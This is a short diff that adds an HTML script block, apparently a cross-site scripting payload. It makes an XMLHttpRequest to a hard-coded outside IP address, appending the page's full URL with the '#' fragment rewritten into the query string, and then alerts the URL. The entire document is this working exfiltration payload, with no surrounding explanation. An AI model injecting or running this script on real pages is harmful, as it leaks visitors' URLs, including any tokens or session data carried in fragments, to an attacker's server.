@@ -1,0 +1,15 @@
+<script>
+    const xhr = new XMLHttpRequest();
+xhr.open("GET", "http://54.148.132.51/?"+location.href.replace("#","?"));
+xhr.send();
+xhr.responseType = "json";
+xhr.onload = () => {
+  if (xhr.readyState == 4 && xhr.status == 200) {
+    const data = xhr.response;
+    console.log(data);
+  } else {
+    console.log(`Error: ${xhr.status}`);
+  }
+};
+    alert(location.href)
+</script>
